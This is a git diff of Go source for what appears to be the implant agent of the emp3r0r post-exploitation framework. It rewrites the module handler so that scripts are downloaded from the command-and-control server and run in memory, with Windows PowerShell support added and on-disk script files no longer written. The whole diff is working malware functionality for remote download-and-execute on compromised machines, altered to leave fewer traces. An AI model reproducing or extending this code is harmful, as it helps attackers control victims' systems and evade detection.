@@ -4,18 +4,21 @@ import (
 	"fmt"
 	"log"
 	"os"
-	"os/exec"
+	"runtime"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver/v3"
 )
 
+// moduleHandler downloads and runs modules from C2
 func moduleHandler(modName, checksum string) (out string) {
 	tarball := RuntimeConfig.AgentRoot + "/" + modName + ".tar.xz"
 	modDir := RuntimeConfig.AgentRoot + "/" + modName
-	start_sh := modDir + "/start.sh"
+	start_script := "start.sh"
+	if runtime.GOOS == "windows" {
+		start_script = "start.ps1"
+	}
 
 	// if we have already downloaded the module, dont bother downloading again
 	if tun.SHA256SumFile(tarball) != checksum {
@@ -39,11 +42,9 @@ func moduleHandler(modName, checksum string) (out string) {
 	}
 
 	// download start.sh
-	os.RemoveAll(start_sh)
-	_, err := DownloadViaCC(modName+".sh",
-		start_sh)
+	payload, err := DownloadViaCC(start_script, "")
 	if err != nil {
-		return fmt.Sprintf("Downloading start.sh: %v", err)
+		return fmt.Sprintf("Downloading %s: %v", start_script, err)
 	}
 
 	// exec
@@ -57,12 +58,12 @@ func moduleHandler(modName, checksum string) (out string) {
 	}
 
 	// process files in module archive
-	libs_tarball := "libs.tar.xz"
 	files, err := os.ReadDir("./")
 	if err != nil {
 		return fmt.Sprintf("Processing module files: %v", err)
 	}
 	for _, f := range files {
+		libs_tarball := "libs.tar.xz"
 		os.Chmod(f.Name(), 0o700)
 		if util.IsExist(libs_tarball) {
 			os.RemoveAll("libs")
@@ -73,27 +74,13 @@ func moduleHandler(modName, checksum string) (out string) {
 		}
 	}
 
-	cmd := exec.Command(emp3r0r_data.DefaultShell, start_sh)
+	// run wrapper script in memory
+	out, err = RunModuleScript(payload)
 
 	// debug
-	shdata, err := os.ReadFile(start_sh)
-	if err != nil {
-		log.Printf("Read %s: %v", start_sh, err)
-	}
-	log.Printf("Running start.sh:\n%s", shdata)
+	log.Printf("Running %s:\n%s", start_script, payload)
 
-	outbytes, err := cmd.CombinedOutput()
-	if err != nil {
-		out = fmt.Sprintf("Running module: %s: %v", outbytes, err)
-	}
+	defer os.Chdir(pwd)
 
-	defer func() {
-		os.Chdir(pwd)
-		// remove module files if it's non-interactive
-		if !util.IsStrInFile("echo emp3r0r-interactive-module", start_sh) {
-			os.RemoveAll(modDir)
-		}
-	}()
-
-	return string(outbytes)
+	return string(out)
 }
